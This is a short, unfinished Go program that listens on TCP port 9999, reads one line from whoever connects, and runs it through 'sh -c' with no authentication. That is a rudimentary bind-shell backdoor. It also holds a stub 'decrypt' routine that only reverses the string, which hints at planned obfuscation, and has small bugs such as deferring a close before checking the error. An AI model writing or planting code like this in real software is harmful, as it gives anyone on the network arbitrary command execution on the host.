package main

import (
	"fmt"
	"net"
	"bufio"
	"log"
	"strings"
	"slices"
	"os/exec"
)

func decrypt(v string) (string, error) {
 //13tor
	// n := len(v)
	arr := []byte(v)
	slices.Reverse(arr)
	return string(arr), nil
}

func handler(listener net.Listener) error {
	return nil
}


func main() {
	listener, err := net.Listen("tcp", ":9999")
	if err != nil {
		log.Fatalf("error while bootstrapping tcp listener: aklsdjf;a: %v\n", err)
	}
	defer listener.Close() 
	fmt.Println(listener)
	fmt.Println("accepting new connections..")

	conn, err := listener.Accept()
	defer conn.Close()
	if err != nil {
		log.Fatalf("error accepting a new connection")
	}
	fmt.Println(conn)
	reader := bufio.NewReader(conn)
	// if err != nil {
	// 	log.Error("error while reading the tcp connection")
	// }

	message, err := reader.ReadString('\n')
	if  err != nil {
		log.Print("wasn't able to read for some reason..")
	}

	//decrypted, err := decrypt(message)
	//fmt.Println(strings.ToUpper(decrypted))

	// fmt.Println(message)
	command := message
	// cmd := strings.Split("ps -ef") message, "
	log.Println(command)
	out, err := exec.Command("sh", "-c", strings.TrimSpace(command)).Output()

	if err != nil {
		log.Fatalf("error occurred while running the command", err)
	}
	// err = cmd.Run()
	log.Println(string(out)) 
}
